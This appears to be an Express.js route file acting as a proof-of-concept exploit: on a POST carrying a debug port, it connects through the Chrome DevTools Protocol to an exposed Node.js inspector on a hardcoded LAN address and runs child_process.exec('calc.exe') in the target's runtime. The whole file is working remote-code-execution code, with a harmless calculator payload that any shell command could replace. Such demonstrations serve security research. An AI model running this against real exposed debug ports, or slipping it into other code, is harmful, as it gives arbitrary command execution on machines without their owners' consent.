var express = require('express');
var router = express.Router();

const CDP = require('chrome-remote-interface');

async function popCalc(host, port) {
  // Ref: https://blog.sqreen.com/remote-debugging-nodejs-runtime-code-injection/
  const client = await CDP({
    port: port,
    host: host,
  });
  await client.Runtime.enable();

  // pop calc.
  // const calcResult = await client.Runtime.evaluate({
  //   expression: "require('child_process').exec('calc.exe')",
  //   includeCommandLineAPI: false,
  //   returnByValue: false,
  // });

  const calcResult = await client.Runtime.evaluate({
    expression: "require('child_process').exec('calc.exe');",
    includeCommandLineAPI: true,
    returnByValue: false,
  });

  console.log(JSON.stringify(calcResult.result));

  await client.close();
}

/* Inspect the port that came in.
   Incoming body looks like {"debugPort":55000} and it's already parsed.
*/
router.post('/', function(req, res, next) {
  const port = req.body.debugPort;
  
  // Now we need to inspect 'localhost:port'. Cannot do it with the inspector
  // module, it's for running a server and listening.

  // ZZZ Change the IP address here.
  popCalc('192.168.1.130', port);
  res.send('popped calc?');
});

module.exports = router;
